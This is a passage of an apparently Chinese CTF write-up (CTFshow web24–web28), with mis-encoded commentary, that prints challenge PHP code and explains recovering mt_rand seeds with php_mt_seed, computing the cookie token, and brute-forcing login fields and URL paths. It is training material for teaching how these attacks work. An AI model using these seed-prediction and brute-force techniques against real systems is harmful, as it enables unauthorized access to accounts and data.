if (isset($_GET['r'])) { 
  // å¦‚æœä¼ é€’äº†åä¸º "r" çš„å‚æ•°ï¼Œå°±å°†å…¶å€¼èµ‹ç»™å˜é‡ $rã€‚
  $r = $_GET['r']; 
  // ä½¿ç”¨å›ºå®šçš„ç§å­å€¼ 372619038 æ¥åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼ˆmt_srandï¼‰ï¼Œè¿™æ„å‘³ç€åç»­æ¯æ¬¡è°ƒç”¨ mt_rand() ç”Ÿæˆçš„éšæœºæ•°åºåˆ—å°†æ˜¯å›ºå®šçš„ã€‚
  mt_srand(372619038); 
  // å°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•° $r è½¬æ¢ä¸ºæ•´æ•°ï¼ˆintvalï¼‰ï¼Œå¹¶ä¸é€šè¿‡ mt_rand() å‡½æ•°ç”Ÿæˆçš„éšæœºæ•°ï¼ˆåŒæ ·è½¬æ¢ä¸ºæ•´æ•°åï¼‰è¿›è¡Œä¸¥æ ¼ç›¸ç­‰ï¼ˆ===ï¼‰æ¯”è¾ƒã€‚
  // å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œå°±è¾“å‡º $flag å˜é‡çš„å€¼ï¼Œè¿™é‡Œçš„ $flag åº”è¯¥å°±æ˜¯ä»å‰é¢å¼•å…¥çš„ "flag.php" æ–‡ä»¶ä¸­è·å–åˆ°çš„å…³é”®ä¿¡æ¯ã€‚
  if (intval($r) === intval(mt_rand())) {
    echo $flag;
  }
} else {
  // å¦‚æœæ²¡æœ‰é€šè¿‡GETæ–¹å¼ä¼ é€’ "r" å‚æ•°ï¼Œå°±å…ˆä½¿ç”¨ highlight_file å‡½æ•°è¾“å‡ºå½“å‰è¿™ä¸ªPHPæ–‡ä»¶è‡ªèº«çš„æºä»£ç å†…å®¹ï¼Œæ–¹ä¾¿æŸ¥çœ‹ä»£ç é€»è¾‘ç­‰æƒ…å†µã€‚
  highlight_file(__FILE__); 
  // æ¥ç€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ "cat /proc/version"ï¼Œå¹¶è¾“å‡ºè¯¥å‘½ä»¤æ‰§è¡Œåçš„ç»“æœï¼Œè¿™ä¸ªå‘½ä»¤é€šå¸¸ç”¨äºæŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬ç­‰ç›¸å…³ä¿¡æ¯ã€‚
  echo system('cat /proc/version');
}

?>
```

> âœ¨ä¼ªéšæœºæ•°
>
> mt_srand(372619038) å·²ç»ç”¨å›ºå®šçš„ç§å­åˆå§‹åŒ–äº†
>
> mt_rand() åœ¨ç›¸åŒæ¬¡æ•°ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯å›ºå®šçš„
>
> æ¯”å¦‚ä¸¤å°è®¾å¤‡ï¼Œä½¿ç”¨åŒä¸€ä¸ªéšæœºæ•°ç§å­åˆå§‹åŒ–ä¹‹åã€‚ä»–ä»¬ç›¸åŒæ¬¡æ•°äº§ç”Ÿçš„éšæœºæ•°æ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯ä¸åŒæ¬¡æ•°ä¹‹é—´äº§ç”Ÿçš„éšæœºæ•°æ˜¯ä¸ä¸€è‡´çš„ã€‚

```php
<?php
mt_srand(372619038);
echo intval(mt_rand());
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736491792513-4ed4debf-db76-434b-9b3f-6e6a26664039.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736491828893-f9abbf7d-80ea-440b-9f54-2df95ed9e769.png)

## web25

> hintï¼šçˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

* ä¸Šè¿°éƒ¨åˆ†æ˜¯ä»£ç å¤´éƒ¨çš„æ³¨é‡Šä¿¡æ¯ï¼ŒåŒ…å«äº†è¯¸å¦‚ç¼–ç æ ¼å¼å£°æ˜ã€ä½œè€…ä¿¡æ¯ã€åˆ›å»ºåŠä¿®æ”¹æ—¥æœŸã€ä½œè€…é‚®ç®±ä»¥åŠç›¸å…³é“¾æ¥ç­‰å†…å®¹ï¼Œä¸»è¦æ˜¯å¯¹ä»£ç çš„ä¸€äº›åŸºç¡€æè¿°ï¼Œä¸å…·ä½“çš„ä»£ç æ‰§è¡Œé€»è¾‘å…³è”æ€§ä¸å¤§ã€‚
*/

// å…³é—­PHPçš„é”™è¯¯æŠ¥å‘ŠåŠŸèƒ½ï¼Œè¿™æ ·åœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¸ä¼šå°†é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºåœ¨é¡µé¢ç­‰è¾“å‡ºä½ç½®ã€‚
error_reporting(0); 

// å¼•å…¥åä¸º"flag.php"çš„æ–‡ä»¶ï¼Œé€šå¸¸è¿™ä¸ªæ–‡ä»¶é‡Œå¯èƒ½å®šä¹‰äº†å…³é”®çš„å˜é‡ï¼ˆä¾‹å¦‚å¯èƒ½åŒ…å«äº†è¦è¾“å‡ºçš„ç±»ä¼¼"flag"è¿™æ ·çš„é‡è¦ä¿¡æ¯ï¼‰ï¼Œä¸è¿‡ä»£ç ä¸­å¹¶æœªå±•ç¤º"flag.php"çš„å…·ä½“å†…å®¹ã€‚
include("flag.php"); 

// åˆ¤æ–­æ˜¯å¦é€šè¿‡GETæ–¹å¼æ¥æ”¶åˆ°åä¸º"r"çš„å‚æ•°ã€‚
if (isset($_GET['r'])) { 
    // å¦‚æœæ¥æ”¶åˆ°äº†åä¸º"r"çš„å‚æ•°ï¼Œå°†å…¶å€¼èµ‹ç»™å˜é‡$rã€‚
    $r = $_GET['r']; 
    // ä»¥ä¸‹è¿™è¡Œä»£ç é€»è¾‘è¾ƒä¸ºå…³é”®ä¸”å¤æ‚ï¼š
    // é¦–å…ˆå¯¹$flagå˜é‡ï¼ˆä»å‰é¢å¼•å…¥çš„"flag.php"ä¸­è·å–ï¼Œæ¨æµ‹å…¶å­˜å‚¨é‡è¦ä¿¡æ¯ï¼‰è¿›è¡ŒMD5åŠ å¯†ï¼Œç„¶åæˆªå–åŠ å¯†ç»“æœçš„å‰8ä¸ªå­—ç¬¦ï¼Œå†é€šè¿‡hexdecå‡½æ•°å°†è¿™8ä¸ªåå…­è¿›åˆ¶å­—ç¬¦è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ï¼Œæœ€åç”¨è¿™ä¸ªåè¿›åˆ¶æ•°ä½œä¸ºç§å­æ¥åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼ˆmt_srandï¼‰ã€‚
    // è¿™æ ·åšæ„å‘³ç€éšæœºæ•°ç”Ÿæˆçš„åºåˆ—æ˜¯åŸºäº$flagçš„éƒ¨åˆ†MD5å€¼æ¥ç¡®å®šçš„ï¼Œå¢åŠ äº†ä¸€å®šçš„å…³è”æ€§å’Œå¤æ‚æ€§ã€‚
    mt_srand(hexdec(substr(md5($flag), 0, 8))); 
    // è®¡ç®—ä¸€ä¸ªå·®å€¼ï¼Œç”¨é€šè¿‡GETæ–¹å¼è·å–çš„å‚æ•°$rè½¬æ¢ä¸ºæ•´æ•°åï¼Œå‡å»ç”±åˆå§‹åŒ–åçš„éšæœºæ•°ç”Ÿæˆå™¨ï¼ˆåŸºäºå‰é¢çš„è§„åˆ™ï¼‰ç”Ÿæˆçš„éšæœºæ•°ï¼ˆåŒæ ·è½¬æ¢ä¸ºæ•´æ•°ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªå·®å€¼èµ‹å€¼ç»™å˜é‡$randã€‚
    $rand = intval($r) - intval(mt_rand()); 
    // åˆ¤æ–­$randçš„å€¼æ˜¯å¦ä¸º0ï¼ˆé€šè¿‡å°†$randä½œä¸ºå¸ƒå°”å€¼åˆ¤æ–­ï¼Œå€¼ä¸º0æ—¶åœ¨PHPä¸­ä¼šè¢«è§†ä¸ºfalseï¼Œé0å€¼è§†ä¸ºtrueï¼‰ï¼Œå¦‚æœä¸º0ï¼Œè¿›å…¥ä¸‹é¢çš„åµŒå¥—åˆ¤æ–­ã€‚
    if ((!$rand)) { 
        // è¿›ä¸€æ­¥åˆ¤æ–­ï¼Œæ£€æŸ¥åä¸º"token"çš„COOKIEå€¼æ˜¯å¦ç­‰äºä¸¤æ¬¡è°ƒç”¨mt_randå‡½æ•°ç”Ÿæˆçš„éšæœºæ•°ç›¸åŠ çš„ç»“æœï¼ˆè¿™é‡Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°åŸºäºå‰é¢è®¾å®šçš„ç§å­ï¼Œæœ‰ä¸€å®šå…³è”æ€§ï¼‰ã€‚
        // å¦‚æœè¿™ä¸ªæ¡ä»¶ä¹Ÿæ»¡è¶³ï¼Œå°±è¾“å‡º$flagå˜é‡çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸæœ›çš„å…³é”®ä¿¡æ¯ã€‚
        if ($_COOKIE['token'] == (mt_rand() + mt_rand())) {
            echo $flag;
        }
    } else {
        // å¦‚æœ$randçš„å€¼ä¸ä¸º0ï¼Œç›´æ¥è¾“å‡ºè¿™ä¸ªå·®å€¼$randçš„å€¼ï¼Œå¯èƒ½ç”¨äºè°ƒè¯•æˆ–è€…åé¦ˆç»™ç”¨æˆ·ä¸€äº›ä¿¡æ¯ã€‚
        echo $rand;
    }
} else {
    // å¦‚æœæ²¡æœ‰é€šè¿‡GETæ–¹å¼æ¥æ”¶åˆ°åä¸º"r"çš„å‚æ•°ï¼Œå…ˆä½¿ç”¨highlight_fileå‡½æ•°è¾“å‡ºå½“å‰è¿™ä¸ªPHPæ–‡ä»¶è‡ªèº«çš„æºä»£ç å†…å®¹ï¼Œæ–¹ä¾¿æŸ¥çœ‹ä»£ç é€»è¾‘ç­‰æƒ…å†µã€‚
    highlight_file(__FILE__); 
    // æ¥ç€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"cat /proc/version"ï¼Œå¹¶è¾“å‡ºè¯¥å‘½ä»¤æ‰§è¡Œåçš„ç»“æœï¼Œè¿™ä¸ªå‘½ä»¤é€šå¸¸ç”¨äºæŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬ç­‰ç›¸å…³ä¿¡æ¯ã€‚
    echo system('cat /proc/version');
}

?>
```

> âœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ¬¡ç”Ÿæˆçš„éšæœºæ•°ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå…ˆä¼ å…¥ r=0ï¼Œå¾—åˆ° mt_rand() çš„å€¼

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736492767523-99e2bf71-c4a1-4ef5-a557-10ea0d97d40c.png)

> âœ¨çœ‹å‡º mt_rand()å€¼ä¸º 47716040 , ä¼ å…¥ r= 47716040
>
> ä½¿ç”¨ php_mt_seed è„šæœ¬çˆ†ç ´ç§å­
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736496632540-2b7bb313-cb14-444e-86f3-0a05bc2accec.png)
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736498071280-62a1719c-caa5-440d-8cdf-7a05240754ae.png)
>
> å¯è§ï¼Œæˆ‘ä»¬çˆ†å‡ºäº†ä¸€å †ç§å­ï¼Œå¹¶ä¸”çŸ¥é“äº†ç‰ˆæœ¬ï¼Œé‚£ä¹ˆä¹‹åä¸€ä¸ªä¸€ä¸ªè¯•

```php
<?php
mt_srand(2795750851);
echo mt_rand().PHP_EOL;
echo mt_rand()+mt_rand();
// tokençš„å€¼ç¬¬äºŒå’Œç¬¬ä¸‰æ¬¡éšæœºæ•°çš„å’Œ
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736498202895-0552e597-7f61-495f-9aed-c49a69d1159c.png)

## web26

> hintï¼šè¿™ä¸ªå¯ä»¥çˆ†

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500384589-3ed8d558-2902-43fd-a3f3-c88beba87e36.png)

æŠ“åŒ…çˆ†ç ´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500299038-cb96062f-f75a-420b-a8fc-a403b63e1289.png)

## web27

> hintï¼šCTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500513981-b2073974-ddcd-4caf-89d0-cd22fe2307fb.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500523116-8c13867b-7ab5-403b-a2d7-f9056aae9d26.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736500624181-db968548-bd20-480a-a0c9-fce658ba3bb2.png)

æŠ“åŒ…çˆ†ç ´

ä½¿ç”¨é›†æŸçˆ†ç ´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501908349-d0014ab6-2348-4947-bdb9-70e8a3854936.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501935892-cef209be-c9af-4e69-a1d9-54b057babe31.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501953228-5d6479da-2e27-4deb-90f9-aee791c38bc3.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501971297-880b3d2a-74b1-4b4c-82f3-7e61d79b8f56.png)

çˆ†ç ´å‡ºæ˜¯ 19900201

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736501989385-e695d003-89a3-471d-bebf-55c6f6fa4ba9.png)

è§£ç ä¸€ä¸‹

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502029401-b2774d21-4e61-45b7-be0f-cbe1cd806820.png)

è§£ç ä¸€ä¸‹

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502395495-2129c488-0b04-4b61-891f-6d6d46c403fc.png)

ç»“æŸ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736502475488-30953c80-c012-41a5-af17-a2715351e083.png)

## web28

> hintï¼šå¤§æµ·æé’ˆ

çœ‹ url æœ‰ 3 ä¸ªä½ç½®å¯ä»¥çˆ†ç ´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736506786703-7e643696-17e4-48c9-abac-1700e6f73678.png)

> âœ¨é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œåªè¦ä½ç½® 3 å­˜åœ¨ï¼Œæ— è®ºä¿®æ”¹å“ªä¸ªä½ç½®ï¼Œéƒ½ä¼šå¯¼è‡´é¡µé¢é‡å®šå‘ï¼Œå› æ­¤è¦åˆ å»ä½ç½® 3ï¼Œå¯¹ 1 å’Œ 2 ä½ç½®è¿›è¡Œçˆ†ç ´

ä½¿ç”¨é›†æŸçˆ†ç ´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505844001-5a196ae1-6a6a-41dd-9645-ec7e6dffcbd9.png)

è®¾å®šä» 0 åˆ° 100

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505863300-8af6470e-5f19-45d8-9fda-306326e271cc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505888075-ee6ecf42-d1e4-4235-92bb-b2db61c8a2d9.png)

å‡ºç»“æœäº†

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505922713-51c5e2d4-858c-4ef4-9ba9-22dc28f736d9.png)

 æŸ¥çœ‹å“åº”

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736505933160-dad0a258-f48a-41b4-833a-9fc42a49decd.png)

